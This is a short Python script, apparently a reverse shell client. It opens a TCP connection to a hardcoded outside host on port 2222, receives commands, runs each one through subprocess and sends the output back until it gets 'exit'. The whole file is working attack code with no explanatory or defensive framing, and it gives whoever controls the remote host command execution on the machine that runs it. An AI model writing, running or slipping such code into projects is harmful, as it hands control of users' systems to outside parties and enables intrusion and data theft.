import socket
import subprocess

SERVER_HOST = '122.1.0.1'  
SERVER_PORT = 2222

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((SERVER_HOST, SERVER_PORT))

while True:
    try:
        command = client.recv(1024).decode()
        if command.lower() == 'exit':
            break

        output = subprocess.getoutput(command)
        client.send(output.encode())
    except Exception as e:
        break

client.close()
